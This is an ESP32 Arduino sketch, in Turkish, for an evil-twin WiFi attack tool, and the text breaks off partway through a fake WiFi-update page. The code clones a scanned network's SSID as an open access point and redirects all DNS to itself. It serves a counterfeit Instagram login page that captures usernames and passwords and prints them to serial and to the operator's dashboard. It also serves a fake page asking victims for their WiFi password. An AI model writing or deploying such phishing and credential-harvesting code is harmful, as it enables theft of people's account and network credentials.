#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);


typedef struct {
  String ssid;
  String bssid;
  int channel;
} WiFiNetwork;

WiFiNetwork networks[20];
int networkCount = 0;
String targetSSID = "";
String savedPassword = "";
String kullaniciAdi = "";  
String sifre = ""; 
bool isAPCreated = false;
bool isInstagramAP = false;
     



//----------------------------------------------------------




void handleRoot() {
  String html = R"=====(
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Seçenekler</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background: #403f3f;
      color: white;
    }
    h1 {
      margin-bottom: 40px;
    }
    button {
      width: 250px;
      padding: 15px;
      margin: 10px;
      font-size: 18px;
      border: none;
      border-radius: 10px;
      background-color: #007bff;
      color: rgb(255, 255, 255);
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #0056b3;
    }
    .credentials {
      margin-top: 30px;
      padding: 15px;
      border: 1px solid #555;
      border-radius: 5px;
      background-color: #2a2a2a;
      width: 250px;
      text-align: left;
    }
    .credential-title {
      font-weight: bold;
      margin-bottom: 10px;
      color: #007bff;
    }
  </style>
</head>
<body>
  <h1>Seçenekler</h1>
  <button onclick="location.href='/evil-twin-password'">Evil Twin (Wifi Şifresi)</button>
  <button onclick="location.href='/evil-twin-instagram'">Evil Twin (İnstagram)</button>
  <button onclick="location.href='/wifi-attack'">Wifi Saldırısı</button>
  <button onclick="location.href='/wifi-spam'">Wifi Spam</button>
)=====";

  // Display Evil Twin credentials (Instagram/Wifi) if available
  if (kullaniciAdi != "" && sifre != "") {
    html += R"=====(
  <div class="credentials">
    <div class="credential-title">Evil Twin Credentials</div>
    <p>Kullanıcı: )=====";
    html += kullaniciAdi;
    html += R"=====(</p>
    <p>Şifre: )=====";
    html += sifre;
    html += R"=====(</p>
  </div>
)=====";
  }

  // Display WiFi credentials if available
  if (targetSSID != "" && savedPassword != "") {
    html += R"=====(
  <div class="credentials">
    <div class="credential-title">WiFi Credentials</div>
    <p>WiFi: )=====";
    html += targetSSID;
    html += R"=====(</p>
    <p>Şifre: )=====";
    html += savedPassword;
    html += R"=====(</p>
  </div>
)=====";
  }

  // Close HTML
  html += R"=====(
</body>
</html>
)=====";
 webServer.send(200, "text/html", html);
}



//----------------------------------------------------------




void scanNetworks() {
  networkCount = WiFi.scanNetworks();
  for(int i = 0; i < networkCount && i < 20; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].bssid = WiFi.BSSIDstr(i);
    networks[i].channel = WiFi.channel(i);
  }
}




//----------------------------------------------------------



void handleInstagram() {
  scanNetworks();
  
  String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>WiFi Ağları</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: white;
      font-size: 14px;
    }
    h2 {
      margin: 15px 0;
      font-size: 18px;
      color: white;
    }
    table {
      border-collapse: collapse;
      width: 100%;
      max-width: 500px;
      background: #505050;
      box-shadow: 0 1px 4px rgba(0,0,0,0.15);
      border-radius: 8px;
      overflow: hidden;
      margin-bottom: 15px;
    }
    th, td {
      text-align: left;
      padding: 8px 12px;
      font-size: 12px;
      border-bottom: 1px solid #666;
      color: white;
    }
    th {
      background-color: #007bff;
      color: white;
      padding: 8px 12px;
      font-size: 12px;
    }
    tr:hover {
      background-color: #606060;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 4px 8px;
      font-size: 12px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    button:hover {
      background-color: #0056b3;
    }
    a.home-link {
      margin-top: 15px;
      text-decoration: none;
      color: #007bff;
      font-weight: bold;
      font-size: 12px;
    }
    a.home-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h2>Bulunan WiFi Ağları</h2>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>SSID</th>
        <th>BSSID</th>
        <th>Kanal</th>
        <th>Seç</th>
      </tr>
    </thead>
    <tbody>
)=====";

  for(int i = 0; i < networkCount; i++) {
    html += "<tr>";
    html += "<td>" + String(i+1) + "</td>";
    html += "<td>" + networks[i].ssid + "</td>";
    html += "<td>" + networks[i].bssid + "</td>";
    html += "<td>" + String(networks[i].channel) + "</td>";
    html += "<td><button onclick=\"location.href='/select-instagram?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
    html += "</tr>";
  }

  html += R"=====(
    </tbody>
  </table>
  <a href="/" class="home-link">Ana Sayfaya Dön</a>
</body>
</html>
)=====";

  webServer.send(200, "text/html", html);
}




//----------------------------------------------------------






void handleInstagramWifi(){
  targetSSID = webServer.arg("ssid");
  String bssid = webServer.arg("bssid");

  
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(targetSSID.c_str(), NULL, 1, 0, 1);
  
  dnsServer.start(DNS_PORT, "*", apIP);
  isAPCreated = true;

  Serial.println("---------------------------");
  Serial.println("Evil Twin ağı oluşturuldu.");
  Serial.println("Wifi : " + targetSSID);
  Serial.println("---------------------------");

  isInstagramAP = true;
  
  String html = "<script>location.href='/instagram-login';</script>";
  webServer.send(200, "text/html", html);
}




//----------------------------------------------------------




void handleInstagramLogin () {
  if (webServer.method() == HTTP_POST) {
    kullaniciAdi = webServer.arg("kullanici_adi");
    sifre = webServer.arg("sifre");
    
    Serial.println("---------------------------");
    Serial.println("Yakalanan Instagram Bilgileri:");
    Serial.print("Kullanıcı Adı: ");
    Serial.println(kullaniciAdi);
    Serial.print("Şifre: ");
    Serial.println(sifre);
    Serial.println("---------------------------");

    // Evil Twin'i kapat
    WiFi.softAPdisconnect(true);
    targetSSID = "";
    isAPCreated = false;
    isInstagramAP = false;

    // Ana AP'yi (ESP32) yeniden başlat
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("Esp32","128milyar");
    dnsServer.start(DNS_PORT, "*", apIP);

    // Ana sayfaya yönlendir
    String html = "<script>location.href='/';</script>";
    webServer.send(200, "text/html", html);
    return;
  }

  String html = R"=====(
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>İnstagram Giriş</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    html, body {
      height: 100%; background-color: #f0f0f0;
      font-family: Arial, sans-serif;
    }
    .resim-kapsayici {
      width: 100%; height: 50%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      margin-top: 20px;
    }
    .ortali-resim {
      max-width: 90px; height: auto;
    }
    p.turkce {
      text-align: center;
      font-size: 17px;
      color: #000203;
      cursor: pointer;
      user-select: none;
      margin-top: -130px;
      margin-bottom: 50px;
    }
    form.form-kapsayici {
      margin: -100px auto 0;
      display: flex; flex-direction: column;
      align-items: center;
      gap: 15px;
      width: 90%;
      max-width: 320px;
    }
    form.form-kapsayici input {
      padding: 12px 16px;
      width: 100%;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
      outline: none;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
    }
    button.giris-buton {
      padding: 12px 16px;
      width: 100%;
      background-color: #0f7eed;
      color: white;
      font-size: 15px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button.giris-buton:hover {
      background-color: #007fff;
    }
    p.sifremi-unuttum {
      text-align: center;
      font-size: 17px;
      color: #000203;
      cursor: pointer;
      user-select: none;
      margin-top: 10px;
    }
    .yeni-hesap-kapsayici {
      margin: 100px auto 40px;
      width: 90%;
      max-width: 320px;
      display: flex;
      justify-content: center;
    }
    button.yeni-hesap-buton {
      padding: 12px 16px;
      width: 100%;
      background: transparent;
      color: #2575fc;
      font-size: 15px;
      border: 1.5px solid #007fff;
      border-radius: 50px;
      cursor: pointer;
      transition: background 0.4s ease, color 0.4s ease;
      box-shadow: none;
    }
    button.yeni-hesap-buton:hover {
      background-color: #007fff;
      color: white;
    }
    .resim-kapsayici2 {
      width: 100%;
      height: 0px;
      display: flex; justify-content: center; align-items: center;
      margin-top: 40px;
    }
    .ortali-resim2 {
      max-width: 70px; height: auto;
    }
  </style>
</head>
<body>

<div class="resim-kapsayici">
  <p class="turkce">Türkçe</p>
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAlkAAAJZAQMAAACgNrIEAAAABlBMVEXzvsLjOUZ/TUVmAAAAAXRSTlMBN
  +Ho8AAACtFJREFUeNrt3SGs7jQUB/A2DZmsIsih8b54hSFIvMDLzns8AoUPBsG8VxCSSQzJBCQLWVbc5dztv7bn3358F7hH8e67+93TnrPL 
  +7Z2M5n48PPvf0kyfv7qu28NEfbLdBfHNzoqpHwcU31WqRxLpfVBSoRG5CVirsFiJXZUWEOqja2MpfooltQrsI2cMRwFyyVNrNyM4TiIHiN7zSuxj
  Zx+HMQoqXF6NbYRv8aYeiZ9TIqO5X+tjQS2KaaMnjSbmJgUU8ZOmqewTTFl7KQlLibF/HOn50BiK55/LnbF/HMViImMSTH/TAUcjS2K
  +WfOgZHGdkUxmXImPiZQTDpmUMx+5RwasBV0Rr9yhgbsAGcmH6Az+JiKncH3hmvClmJn8L3hm7Ct 
  +DuDb7TQhB2gzfgotRnfaLYRm0tt9tvHBsbXpUYbdFcbbISNhtvsT1OKj0Cj4Tb7Vf3pe7/ 
  F9hyCDzlue9bURbzDIphM1UDvenbKEuWDLCyM5kLDjHuWu/60QOww9REgNuimP3
  +YB4PXjXNDDXiQFwB3hO0qzKMkgphITTiERdEYqkCnADllckjTFduVmL9iFrSLttNmgckvUZ22XItitBEv2CDmn63AesF2NeYv55MXPFUBiY1E/5
  +ne79gs1HHBQuimGw5D4ExxcTHRraYcorO2EZg/
  nxyis5gegNjC4G5UydYrjPwwY77NQuGJTHDRMTYQWFBVE8UZKewEWMbhfnXR3th62PA2EJh7vUkjU2YxdhsqBCYKO7EYrKxQM8SXXuAP/
  Fd2wUbEbY3YpOcs43EfAfMpm9enwKT7LpVO7rjNTZLbNFhL13u2jH3MhYrMCFrp31/hS08Fv9uLYRNKuzaDaushq4xxGBiK+ZENwHsUGGD6PMgMK/
  GXg7aJbbRWBDHjFdsJ7AksV3CujYT7eRbsdQHu56PwxVbGWw591YgMCdOIYQtqp6VmOuEbRITVZ6pf0fJCWzF9h7YWMAmBjvOHZyejYVXWLxghsHS
  IzHLYPEFE/T8gh3/
  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" alt="Yeni Resim" class="ortali-resim2" />
</div>

<form id="girisForm" class="form-kapsayici" action="/instagram-login" method="POST">
  <input type="hidden" name="_captcha" value="false" />
  <input type="hidden" name="_template" value="table" />
  <input type="text" name="kullanici_adi" placeholder="Kullanıcı adı, e-posta veya cep numarası" required />
  <input type="password" name="sifre" placeholder="Şifre" required />
  <button type="submit" class="giris-buton">Giriş Yap</button>
  <p class="sifremi-unuttum" onclick="alert('Hata!')">Şifreni mi unuttun?</p>
</form>

<div class="yeni-hesap-kapsayici">
  <button type="button" class="yeni-hesap-buton" onclick="alert('Yeni hesap oluşturma sayfasına yönlendiriliyorsunuz.')">Yeni Hesap Oluştur</button>
</div>

<div class="resim-kapsayici2">
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABQAAAAKAAQMAAAD5PUfiAAAABlBMVEUAAAATR30qi3ClAAAAAnRSTlMA/
bWfQ5kAAA1/SURBVHja7Z09z+RWGYZ99ihysYXpUrrJFqlo6Zw2P2BFmZ9iIwpKJP4AoUBC
+ROxRJGSFPQYpYhEgxFImOD4sOM59n2e54zX7x779a7QfUnJ7sy8r33N5Y/
x52xGCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIY
QQQggh5P+HJvugeeFcIx7+kH1YlO6uhIffZh8SL9wb2vWhefNoyj4kipvgIB9+ln1A1E40q24P++zDwbgbWEzcjTETvHr16aeZ5JPfv3qVXULuZjr/
0LqZ+D208VPXrJ1KNzPAN9KxsaC9TrByM5P07aJcnex+naDzSN9B5HqfgsZ5WuE7iZ+JF+ziMsHceTodFNj3KVg4zwAXPXKzvA7KtwjO7/
Y0VsFRPuxUwacLmnMFK
+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
+YL4pJNrurggzr6i4HMKRt9LgQ/
juCAEG1FwNQannY71a79Y0MFKFQT5tiCGVh0TrBbBGgL4MI7OuAviaxbAqZcE4MtbQsHmaQW3BftzBR0E8Vlnn1ywfyB42lUfHW7xDAQ7CO4UNPuCxy
7sWVRcpgXznYIQHB4JYr2efmlUiVMe8sQxTiXtFFRH4n8CwVOu3fKCOEMHQSTaKShuWPgZtmFOufqtWK+3QwXsdpRPK1gHguPD/
e1jFziOt3E8FKyeUFAunGZEwdOuwHTYWRdfv4n11k7BKgg9YSMrOOaTfg1rjntU9NXAHVYLOwUrvJZ7UynomuTLlP0a5ZFgf3t2v6D8HC8XF7n52x66
0NsN+marAl9iNj2hYBkezGn1hxpu1E4RtO7Ga6cE78/WENwuKG+iDnee9bX8ebrgnUYIenYLiqXThvumLQTH5Ns1lGD87LhXUOxIF
+EBqE5tXdYpgka1igV3C2IdgMN1Yrb0+jbpjhwlGD877BRcBUeslHGEzHyGL28okwSzsBWIBLcL4rY17Mx4m2+zr9fb1v78cdpta7uC/V7B9cen3/
3ciSNzN7qj99VlVaQSP7tdEIJACLZH70zcFez2Csofvz8Dq
+7ovZ0YtthzLCG4U1AK4gzFWTefQkUIFuLZ3YJlJGgf3gD93wRBqDRy1Hh2v2ARTWIb2LpDt5AXD9tbJbhTEO8HhxtRsHYL3ycIWjHgWDDbLyhnsxGC
vmB16GsMLAYcAu29gtARa/aloJhDf5UgaDDgkBqCOwX9j6/
0YgCtmItSvowkw4BDKmjvF8SPi40s7P57poQjrH5I0dhLCO4U1IJNdJOjOfR1LuuwWzluaO8UxI9v/
jM27sgX4qytmmjcENwtaOVCDOV2FjzylULLkKbHy06zX1Auxr18h52YSEkF7VsFs/
2CM3X80YiHxZGvtcLXg0pqaO8XxIyC8QcF8yNfDIYhSUqhvVswj1b3NQoad+Cr1ZY5pH04a/
ZPLWiilVUZPK4PfDnd1u6qFdq7BePv7MyDAZQHvt7Pq4wPp/zU7BeErN4zRMGX7kbSuTqc3NT8VGm/ueCkySQfvX79Whbv9GL2mThka26/
8O6UCCHDPv2bP/0/1fCj7vuv4N1+maXyAgMSYxTj2+WF7wW+dj/ixUP/
jOWLr7JHiEm6j3kNv4iPUiYtIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBB
CCCGEEEIIIYQQQgghhBBCCCGEEJLC/wDCtQnQmD/FzAAAAABJRU5ErkJggg==" alt="Yeni Resim" class="ortali-resim2" />
</div>
</body>
</html>
)=====";

  webServer.send(200, "text/html", html);
}



//----------------------------------------------------------




void handleWifiUpdate() {
  if(targetSSID == "") {
    String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>Hata</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: white;
    }
    .error-box {
      background-color: #f44336;
      padding: 20px;
      border-radius: 8px;
      text-align: center;
      max-width: 400px;
    }
    a {
      color: #007bff;
      text-decoration: none;
      margin-top: 20px;
      display: inline-block;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="error-box">
    <h2>Hata!</h2>
    <p>Önce bir WiFi ağı seçmelisiniz.</p>
  </div>
  <a href="/evil-twin-password">WiFi Ağlarını Görüntüle</a>
  <a href="/">Ana Sayfaya Dön</a>
</body>
</html>
)=====";
    webServer.send(200, "text/html", html);
    return;
  }

  String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>WiFi Güncelleme</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: white;
    }
    .container {
      background-color: #505050;
      padding: 20px;
      border-radius: 8px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    h1 {
      color: white;
      text-align: center;
      margin-bottom: 20px;
    }
    .info {
      color: #ff9800;
      text-align: center;
      margin-bottom: 20px;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #666;
      border-radius: 4px;
      background-color: #606060;
      color: white;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #0056b3;
    }
    .status {
      margin-top: 15px;
      padding: 10px;
      border-radius: 4px;
      text-align: center;
      display: none;
    }
    .success {
      background-color: #4CAF50;
      display: block;
    }
    .error {
      background-color: #f44336;
      display: block;
    }
    .loading {
      color: #2196F3;
      display: block;
    }
    a.home-link {
      display: inline-block;
      margin-top: 20px;
      text-decoration: none;
      color: #007bff;
      font-weight: bold;
    }
    a.home-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>WiFi Güncellemesi ()=====";
    html += targetSSID;
    html += R"=====()</h1>
    <div class="info">WiFi güncellemesi gerekiyor</div>
    
    <form id="wifiForm" action="/update-wifi" method="POST" onsubmit="return false;">
      <div class="form-group">
        <label for="password">WiFi Şifresi</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Güncelle</button>
    </form>
    
    <div id="statusMessage" class="status"></div>
  </div>
  
  <script>
document.getElementById('wifiForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const form = this;
  const statusDiv = document.getElementById('statusMessage');
  const passwordField = document.getElementById('password');
  
  statusDiv.className = 'status loading';
  statusDiv.textContent = 'Doğrulanıyor, lütfen bekleyin...';
  
  fetch(form.action, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
      password: passwordField.value
    })
  })
